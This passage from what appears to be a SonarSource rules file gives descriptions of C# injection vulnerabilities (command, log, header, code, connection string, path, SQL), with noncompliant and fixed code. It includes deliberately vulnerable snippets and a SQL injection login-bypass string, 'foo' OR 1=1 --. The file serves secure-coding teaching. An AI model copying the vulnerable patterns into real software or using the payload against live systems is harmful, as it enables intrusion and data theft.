Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/91\">CWE-91 - XML Injection (aka Blind XPath Injection)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    public void Run(string binary)\n    {\n        Process p = new Process();\n        p.StartInfo.FileName = binary;\n        p.Start();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    public void Run(string binary)\n    {\n        if (binary.Equals(\"/usr/bin/ls\") || binary.Equals(\"/usr/bin/cat\"))\n        {\n            // only ls and cat commands are authorized\n            Process p = new Process();\n            p.StartInfo.FileName = binary;\n            p.Start();\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>System.Diagnostics.ProcessStartInfo</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>Here, using the <code>ProcessStartInfo</code> structure helps escaping the passed arguments and internally creates a single string given to the\noperating system when <code>System.Diagnostics.Process.Start()</code> is called.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5145": {
        "name": "Logging should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>\n<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This\nfrequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log\nentries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,\nLog4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>\n<p>The focus of this rule is newline character replacement.</p>\n<h4>Log Forge</h4>\n<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious\nactivities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to\nfake application events.</p>\n<h2>How to fix it in ASP.NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate\nthe chain of events being recorded.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    private static readonly log4net.ILog _logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);\n\n    [HttpGet]\n    public void Log(string data)\n    {\n        if (data != null)\n        {\n            _logger.Info(\"Log: \" + data); // Noncompliant\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    private static readonly log4net.ILog _logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);\n\n    [HttpGet]\n    public void Log(string data)\n    {\n        if (data != null)\n        {\n            data = data.Replace('\\n', '_').Replace('\\r', '_');\n            _logger.Info(\"Log: \" + data);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and\nsanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on\nthe application context and the logged data usage.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "roslyn.sonaranalyzer.security.cs:S5167": {
        "name": "HTTP response headers should not be vulnerable to injection attacks",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS5122'>S5122</a>, <a href='/coding_rules#rule_key=csharpsquid%3AS5146'>S5146</a>, <a href='/coding_rules#rule_key=csharpsquid%3AS6287'>S6287</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications\nconstructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing\nheaders.</p>\n<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In\nthis case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of\nattack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>\n<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation\nshould be based on a whitelist.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nstring value = Request.QueryString[\"value\"];\nResponse.AddHeader(\"X-Header\", value); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstring value = Request.QueryString[\"value\"];\n// Allow only alphanumeric characters\nif (value == null || !Regex.IsMatch(value, \"^[a-zA-Z0-9]+$\"))\n{\n  throw new Exception(\"Invalid value\");\n}\nResponse.AddHeader(\"X-Header\", value);\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/index.php/HTTP_Response_Splitting\">Attack Category - HTTP Response Splitting</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/113\">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response\n  Splitting')</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "roslyn.sonaranalyzer.security.cs:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.CodeDom.Compiler;\n\npublic class ExampleController : Controller\n{\n    public void Run(string message)\n    {\n        const string code = @\"\n            using System;\n            public class MyClass\n            {\n                public void MyMethod()\n                {\n                    Console.WriteLine(\"\"\" + message + @\"\"\");\n                }\n            }\n        \";\n\n        var provider = CodeDomProvider.CreateProvider(\"CSharp\");\n        var compilerParameters = new CompilerParameters { ReferencedAssemblies = { \"System.dll\", \"System.Runtime.dll\" } };\n        var compilerResults = provider.CompileAssemblyFromSource(compilerParameters, code);\n        object myInstance = compilerResults.CompiledAssembly.CreateInstance(\"MyClass\");\n        myInstance.GetType().GetMethod(\"MyMethod\").Invoke(myInstance, new object[0]);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.CodeDom.Compiler;\n\npublic class ExampleController : Controller\n{\n    public void Run(string message)\n    {\n        const string code = @\"\n            using System;\n            public class MyClass\n            {\n                public void MyMethod(string input)\n                {\n                    Console.WriteLine(input);\n                }\n            }\n        \";\n\n        var provider = CodeDomProvider.CreateProvider(\"CSharp\");\n        var compilerParameters = new CompilerParameters { ReferencedAssemblies = { \"System.dll\", \"System.Runtime.dll\" } };\n        var compilerResults = provider.CompileAssemblyFromSource(compilerParameters, code);\n        object myInstance = compilerResults.CompiledAssembly.CreateInstance(\"MyClass\");\n        myInstance.GetType().GetMethod(\"MyMethod\").Invoke(myInstance, new object[]{ message }); // Pass message to dynamic method\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<p>The compliant code example uses such an approach.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S6641": {
        "name": "Connection strings should not be vulnerable to injections attacks",
        "htmlDesc": "<p>Database connection strings control how an application connects to a database. They include information such as the location of the database, how\nto authenticate with the database, and how the connection should be secured.</p>\n<p>The insertion of user-supplied values into a connection string can allow external control of these database connections.</p>\n<h2>Why is this an issue?</h2>\n<p>Connection strings contain a series of parameters that are structured as key/value pairs, similar to <code>key1=value1;key2=value2</code>.</p>\n<p>If an attacker can control values that are inserted into the connection string, they may be able to insert additional parameters. These additional\nparameters can override values that were supplied earlier in the connection string.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker can use specially-crafted values to change how the database connection is made. These values can add new parameters to the connection\nstring, or can override parameters that had already been specified.</p>\n<h4>Escalation of privilege</h4>\n<p>Some database servers allow authentication via an OS user account instead of a username and password. The database connection is authenticated as\nthe user running the application. When this authentication mode is used, any username or password in the connection string are ignored.</p>\n<p>If an attacker can force the use of this authentication mode, the connection will be made as the user that the web application is running under.\nThis will often be the <code>LocalSystem</code> or <code>NetworkService</code> account on Windows. Such accounts are often given a high level of\nprivileges on the database server.</p>\n<h4>Credential theft</h4>\n<p>If an attacker can change the database server in the connection string, they can have the web application connect to a server that they control.\nThe web application will then authenticate with that server, allowing those credentials to be stolen.</p>\n<h4>Bypassing data validation</h4>\n<p>Many web applications implicitly trust data that’s stored in the database. The data is validated before it is stored, so no additional validation\nis performed when that data is loaded.</p>\n<p>If an attacker can change the database server in the connection string, they can have the web application connect to a database server that they\ncontrol. Invalid data in this database could be passed to other services or systems, or could be used to trigger other bugs and logic flaws in the web\napplication.</p>\n<h4>Network traffic sniffing</h4>\n<p>The connection string can control how the connection to the database server is secured. For example, it can control whether connections to\nMicrosoft SQL Server use transport layer security (TLS).</p>\n<p>If an attacker can disable these network security measures and they have some way to monitor traffic between the web server and the database\nserver, they will be able to see all information that’s written to and read from the database.</p>\n<h2>How to fix it in .NET</h2>\n<p>Microsoft’s database connection libraries typically provide a connection string builder class. These classes provide methods and properties that\nsafely set parameter values.</p>\n<p>Connection string builders will only protect you if you use these methods and properties to set parameter values. They will not help if you are\nusing them to modify a connection string where user-supplied values have already been added.</p>\n<p>If no connection string builder is available, user-supplied values must either be validated to ensure that they’re not malicious, or must be\nproperly quoted so that they cannot interfere with other connection string parameters.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic string ConnectionString { get; set; } = \"Server=10.0.0.101;Database=CustomerData\";\n\npublic SqlConnection ConnectToDatabase(HttpRequest request)\n{\n    string connectionString = string.Format(\"{0};User ID={1};Password={2}\",\n        ConnectionString,\n        request.Form[\"username\"],\n        request.Form[\"password\"]);\n\n    SqlConnection connection = new SqlConnection();\n    connection.ConnectionString = connectionString; // Noncompliant\n    connection.Open();\n    return connection;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic string ConnectionString { get; set; } = \"Server=10.0.0.101;Database=CustomerData\";\n\npublic SqlConnection ConnectToDatabase(HttpRequest request)\n{\n    SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder(ConnectionString);\n    builder.UserID = request.Form[\"username\"];\n    builder.Password = request.Form[\"password\"];\n\n    SqlConnection connection = new SqlConnection();\n    connection.ConnectionString = builder.ConnectionString;\n    connection.Open();\n    return connection;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Connection string builders will ensure that values are correctly sanitized when adding them to the connection string.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Microsoft - <a href=\"https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/connection-string-syntax\">Connection string syntax</a>\n  </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> DefCon 18: Alonso Palazon, Connection String Attacks - <a\n  href=\"https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String.pdf\">presentation</a>, <a\n  href=\"https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String-wp.pdf\">white paper</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/15\">CWE-15 - External Control of System or Configuration Setting</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    private static string TargetDirectory = \"/path/to/target/directory/\";\n\n    public void Example(string filename)\n    {\n        string path = Path.Combine(TargetDirectory, filename);\n        System.IO.File.Delete(path);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    private static string TargetDirectory = \"/path/to/target/directory/\";\n\n    public void Example(string filename)\n    {\n        string path = Path.Combine(TargetDirectory, filename);\n        string canonicalDestinationPath = Path.GetFullPath(path);\n\n        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))\n        {\n            System.IO.File.Delete(canonicalDestinationPath);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code>. This will resolve relative path or path\n  components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nprivate static string TargetDirectory = \"/Users/John\";\n\npublic void Example(string filename)\n{\n    string canonicalDestinationPath = Path.GetFullPath(filename);\n\n    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))\n    {\n        System.IO.File.Delete(canonicalDestinationPath);\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny/file\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h4>Do not use Path.Combine as a validator</h4>\n<p>The <a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine\">official documentation</a> states that if any argument other than\nthe first is an absolute path, any previous argument is discarded.</p>\n<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Entity Framework Core</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nfoo' OR 1=1 --\n</pre>\n<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in\nas any user within the scoped user table.</p>\n<h4>Noncompliant code example</h4>\n<pre 